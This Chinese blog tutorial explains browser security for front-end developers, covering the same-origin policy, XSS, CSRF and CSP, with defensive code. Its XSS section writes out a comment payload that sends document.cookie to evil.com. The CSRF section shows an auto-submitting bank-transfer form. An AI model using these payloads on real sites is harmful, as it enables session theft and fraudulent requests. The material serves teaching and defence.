浏览器安全：深入理解XSS、CSRF与CSP

发表于2025|更新于2026|基础知识
|字数总计:2k|阅读时长:9分钟

前言

随着 Web 应用的日益复杂，浏览器安全问题变得越来越重要。作为前端开发者，了解常见的安全漏洞及其防御措施是必备技能。本文将深入介绍浏览器安全的核心概念，包括同源策略、XSS 攻击、CSRF 攻击以及内容安全策略（CSP）。

一、同源策略（Same-Origin Policy）

1.1 什么是同源策略

同源策略是浏览器最核心的安全机制，它限制了一个源的文档或脚本如何与另一个源的资源进行交互。

同源的定义： 如果两个 URL 的协议、域名和端口都相同，则它们是同源的。

// 以 http://www.example.com/page 为例

// 同源
http://www.example.com/other-page        ✓ 同源
http://www.example.com:80/other-page     ✓ 同源（默认端口80）

// 不同源
https://www.example.com/other-page       ✗ 协议不同
http://api.example.com/other-page        ✗ 域名不同
http://www.example.com:8080/other-page   ✗ 端口不同

1.2 同源策略的限制

同源策略主要限制以下行为：

行为 同源 跨域
读取 Cookie、LocalStorage、IndexDB ✓ 允许 ✗ 禁止
获取 DOM 节点 ✓ 允许 ✗ 禁止
发送 AJAX 请求 ✓ 允许 ✗ 禁止（浏览器拦截响应）
加载资源（图片、样式、脚本） ✓ 允许 ✓ 允许

1.3 跨域解决方案

JSONP（已过时）

// 利用 script 标签不受同源策略限制的特性
function jsonp(url, callback) {
  const script = document.createElement('script');
  const callbackName = `jsonp_callback_${Date.now()}`;
  
  window[callbackName] = function(data) {
    callback(data);
    delete window[callbackName];
    document.body.removeChild(script);
  };
  
  script.src = `${url}?callback=${callbackName}`;
  document.body.appendChild(script);
}

// 使用示例
jsonp('http://api.example.com/data', function(data) {
  console.log(data);
});

CORS（Cross-Origin Resource Sharing）

// 服务端设置响应头
// Access-Control-Allow-Origin: *
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE
// Access-Control-Allow-Headers: Content-Type, Authorization

// 前端正常发送请求
fetch('http://api.example.com/data', {
  method: 'GET',
  credentials: 'include' // 携带 Cookie
})
.then(response => response.json())
.then(data => console.log(data));

代理服务器

// webpack.config.js 或 vite.config.js
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'http://api.example.com',
        changeOrigin: true,
        pathRewrite: { '^/api': '' }
      }
    }
  }
};

二、XSS 攻击（Cross-Site Scripting）

2.1 什么是 XSS

XSS 是一种代码注入攻击，攻击者通过在网页中注入恶意脚本，当其他用户浏览网页时，脚本会在用户浏览器中执行。

2.2 XSS 的类型

反射型 XSS

恶意脚本通过 URL 参数传递，服务器将其反射回页面：

// 危险代码示例
// URL: http://example.com/search?keyword=<script>alert('XSS')</script>

// 服务端直接返回
app.get('/search', (req, res) => {
  res.send(`搜索结果：${req.query.keyword}`);
});

存储型 XSS

恶意脚本被存储在服务器（如数据库），每次访问都会执行：

// 攻击者在评论区提交
const comment = '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';

// 保存到数据库，其他用户查看评论时执行

DOM 型 XSS

通过修改 DOM 环境执行恶意脚本：

// 危险代码
document.getElementById('output').innerHTML = location.hash.slice(1);

// URL: http://example.com#<img src=x onerror="alert('XSS')">

2.3 XSS 防御措施

输入过滤与输出编码

// HTML 实体编码
function escapeHtml(str) {
  const escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return str.replace(/[&<>"'/]/g, char => escapeMap[char]);
}

// 使用
const userInput = '<script>alert("XSS")</script>';
document.getElementById('output').textContent = escapeHtml(userInput);
// 输出: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

使用安全的 API

// ❌ 危险：使用 innerHTML
element.innerHTML = userInput;

// ✓ 安全：使用 textContent
element.textContent = userInput;

// ✓ 安全：使用 createElement
const div = document.createElement('div');
div.textContent = userInput;
element.appendChild(div);

内容安全策略（CSP）

<!-- 设置 CSP 响应头 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'">

三、CSRF 攻击（Cross-Site Request Forgery）

3.1 什么是 CSRF

CSRF 是一种伪造用户请求的攻击，攻击者诱导用户访问恶意网站，该网站自动向目标网站发送请求（利用用户已登录的状态）。

3.2 攻击流程

1. 用户登录银行网站 bank.com，获得 Cookie
2. 用户访问恶意网站 evil.com
3. evil.com 包含自动提交的表单：
   <form action="http://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="attacker" />
     <input type="hidden" name="amount" value="10000" />
   </form>
   <script>document.forms[0].submit();</script>
4. 请求自动携带 bank.com 的 Cookie
5. 银行服务器执行转账操作

3.3 CSRF 防御措施

CSRF Token

// 服务端生成 Token
app.get('/form', (req, res) => {
  const csrfToken = generateRandomToken();
  req.session.csrfToken = csrfToken;
  res.render('form', { csrfToken });
});

// 前端表单携带 Token
// <input type="hidden" name="_csrf" value="<%= csrfToken %>">

// 服务端验证
app.post('/submit', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('CSRF token mismatch');
  }
  // 处理请求
});

SameSite Cookie 属性

// 设置 Cookie
res.cookie('sessionId', 'abc123', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // 或 'lax'
});

// SameSite 属性说明：
// - strict: 完全禁止第三方 Cookie
// - lax: 允许 GET 请求携带第三方 Cookie
// - none: 允许所有请求携带（需配合 secure）

验证 Referer 头

app.post('/api/action', (req, res) => {
  const referer = req.headers.referer;
  if (!referer || !referer.startsWith('https://mysite.com')) {
    return res.status(403).send('Invalid referer');
  }
  // 处理请求
});

四、内容安全策略（CSP）

4.1 什么是 CSP

CSP 是一种额外的安全层，用于检测和削弱某些类型的攻击，包括 XSS 和数据注入攻击。

4.2 CSP 指令

指令 说明
default-src 默认资源加载策略
script-src JavaScript 脚本来源
style-src CSS 样式来源
img-src 图片来源
font-src 字体来源
connect-src AJAX/WebSocket 连接目标
frame-src iframe 来源
report-uri 违规报告地址

4.3 CSP 配置示例

<!-- 严格的 CSP 配置 -->
<meta http-equiv="Content-Security-Policy" 
      content="
        default-src 'self';
        script-src 'self' https://cdn.example.com 'nonce-abc123';
        style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
        img-src 'self' data: https:;
        font-src 'self' https://fonts.gstatic.com;
        connect-src 'self' https://api.example.com;
        frame-src 'none';
        report-uri /csp-report;
      ">

4.4 使用 Nonce 和 Hash

<!-- Nonce 方式 -->
<script nonce="abc123">
  console.log('安全的内联脚本');
</script>

<!-- Hash 方式 -->
<!-- Content-Security-Policy: script-src 'sha256-xxx...' -->
<script>
  console.log('通过 Hash 验证的脚本');
</script>

五、其他安全最佳实践

5.1 HttpOnly Cookie

// 防止 JavaScript 读取敏感 Cookie
res.cookie('sessionId', 'abc123', {
  httpOnly: true,  // JavaScript 无法读取
  secure: true,    // 仅 HTTPS 传输
  sameSite: 'strict',
  maxAge: 3600000
});

5.2 安全响应头

// Express 中间件
app.use((req, res, next) => {
  // 防止 MIME 类型嗅探
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // 防止点击劫持
  res.setHeader('X-Frame-Options', 'DENY');
  
  // XSS 过滤
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  // 强制 HTTPS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  
  next();
});

5.3 输入验证

// 使用验证库
const Joi = require('joi');

const schema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  email: Joi.string().email().required(),
  password: Joi.string().pattern(new RegExp('^[a-zA-Z0-9]{3,30}$')).required()
});

app.post('/register', (req, res) => {
  const { error, value } = schema.validate(req.body);
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  // 处理注册逻辑
});

总结

安全问题 核心防御措施
XSS 输出编码、CSP、输入过滤
CSRF CSRF Token、SameSite Cookie、验证 Referer
点击劫持 X-Frame-Options、CSP frame-ancestors
数据泄露 HttpOnly、Secure Cookie、HTTPS
中间人攻击 HTTPS、HSTS

安全是一个持续的过程，需要从开发、测试、部署各个环节层层把关。作为开发者，我们应该时刻保持安全意识，遵循最小权限原则，不信任任何用户输入。
